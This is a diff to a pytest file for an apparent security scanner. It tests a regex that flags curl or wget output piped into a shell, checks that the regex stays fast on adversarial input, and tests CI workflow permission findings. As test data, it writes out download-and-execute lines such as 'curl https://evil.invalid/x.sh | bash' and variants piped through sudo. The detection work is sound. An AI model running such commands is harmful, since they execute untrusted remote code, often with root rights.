@@ -120,6 +120,45 @@ def test_hardened_pattern_is_fast_on_adversarial_line(label, pattern, text):
     assert elapsed < BUDGET, f"{label}: {elapsed:.2f}s"
 
 
+def test_curl_pipe_sudo_flags_stay_linear_far_past_the_window():
+    # The repetition CodeQL's py/redos names ('!\x7f-'), unwindowed and 50 times
+    # longer than any single search normally sees, with no shell at the end so
+    # every way of splitting the flags would be tried by a backtracking match.
+    for unit in ("!\x7f-", "-!\x7f ", "-a\t", "- "):
+        text = "curl x | sudo -" + unit * (50 * MAX_SCAN_LINE // len(unit)) + " !"
+        elapsed = _timed(lambda text=text: CURL_PIPE_SHELL_RE.search(text))
+        assert elapsed < BUDGET, f"{unit!r}: {elapsed:.2f}s"
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "curl https://x.invalid/i.sh | sudo -E bash",
+        "curl x | sudo --preserve-env -H sh",
+        "wget -qO- x |sudo -E zsh",
+        "curl -fsSL x | sudo\t-E\tbash",
+        "fetch -o - x | sh",
+        "CURL x | SUDO -E BASH",
+    ],
+)
+def test_curl_pipe_matches_shell_pipes(text):
+    assert CURL_PIPE_SHELL_RE.search(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "avoid curl | bash",
+        "curl x | sudo -E python",
+        "curl x | sudo -u root tee /etc/x",
+        "curl x > install.sh",
+        "curl x | shellcheck -",
+    ],
+)
+def test_curl_pipe_ignores_non_shell_pipes(text):
+    assert not CURL_PIPE_SHELL_RE.search(text)
+
+
 def test_long_lines_are_windowed_not_skipped():
     payload = "curl https://evil.invalid/x.sh | bash"
     line = " " * (MAX_SCAN_LINE * 3) + payload
@@ -250,6 +289,19 @@ def test_cicd_permissions_block_form_is_detected(tmp_path):
     ctx = _ctx(tmp_path, {".github/workflows/ci.yml": wf})
     hits = [f for f in cicd.CicdScanner().scan(ctx) if f.rule_id == "cicd.excessive-permissions"]
     assert [f.location.start_line for f in hits] == [2]
+
+
+def test_cicd_job_level_contents_write_is_least_privilege(tmp_path):
+    wf = (
+        "on: push\npermissions:\n  contents: read\n"
+        "jobs:\n  deploy:\n    permissions:\n      contents: write\n"
+        "    runs-on: ubuntu-latest\n"
+        "  other:\n    permissions: write-all\n    runs-on: ubuntu-latest\n"
+    )
+    ctx = _ctx(tmp_path, {".github/workflows/ci.yml": wf})
+    hits = [f for f in cicd.CicdScanner().scan(ctx) if f.rule_id == "cicd.excessive-permissions"]
+    # The job that needs contents: write is not reported; write-all still is.
+    assert [f.location.start_line for f in hits] == [10]
 
 
 def test_patterns_scan_of_hostile_file_finishes(tmp_path):
